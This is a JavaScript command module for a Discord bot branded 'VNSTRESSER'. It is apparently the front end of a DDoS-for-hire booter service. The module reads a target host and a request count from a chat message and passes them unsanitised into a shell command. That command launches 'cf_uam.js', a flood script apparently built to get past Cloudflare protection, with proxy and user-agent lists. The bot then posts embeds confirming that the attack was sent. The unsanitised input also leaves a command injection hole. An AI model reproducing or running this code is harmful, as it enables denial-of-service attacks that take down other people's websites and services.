﻿const Discord = require("discord.js");
exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const duration = message.content.split (" ")[2]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

// Example command
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('WARRING')
	.setDescription("`Ex .CF-UAMv2 url request/ip `")
	.setFooter("Thời gian tối đa max 45s thôi nha bé!")
	message.channel.send(embed1);
	return;
	}

// Command attack
var exec = require('child_process').exec
exec(`node cf_uam.js POST ${host} httpxnxx.txt 45 ${duration} 5 cookie="" referer="referer.txt" postdata="" useragent="ua.txt" headerdata="" randomstring=""`, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('Start Attacking ID Discord:' +  message.guild.id)

const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **VNSTRESSER** 🚀')
	.setTimestamp()
  .setDescription("**ᴀᴛᴛᴀᴄᴋ ʜᴀs ʙᴇᴇɴ sᴇɴᴛ** \n **Target** \n `"+ host +"` \n **Method** \n `CF-UAMv2` \n **NumCPU** \n `5` \n **Request/IP** \n `"+ duration +"` \n **Duration** \n `45`")
	.setFooter('© Developer: DonutEater', client.user.avatarURL)
	.setTimestamp()
	.setImage(attackgif)
	.setThumbnail("")
 message.channel.send(embed);
 }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds

// Attack Gif
var gifler = ["https://media1.giphy.com/media/VF63woFTiDvL6bwxky/giphy.gif"];
    var attackgif = gifler[Math.floor((Math.random() * gifler.length))];

// Verify Gif
var gify = ["https://media.giphy.com/media/6036p0cTnjUrNFpAlr/giphy.gif"];
		var loadinggif = gify[Math.floor((Math.random() * gify.length))];

// Start Verify
console.log('Start Verify ID Discord:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **VNSTRESSER** 🚀')
	.setTimestamp()
	.setDescription("** ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ᴛᴏ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ **")
	.setFooter('© Developer: DonutEater', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['raw'],
  permLevel: 0
}

exports.help = {
  name: 'CF-UAMv2',
  description: 'ATTACK',
  usage: 'CF-UAMv2'
}
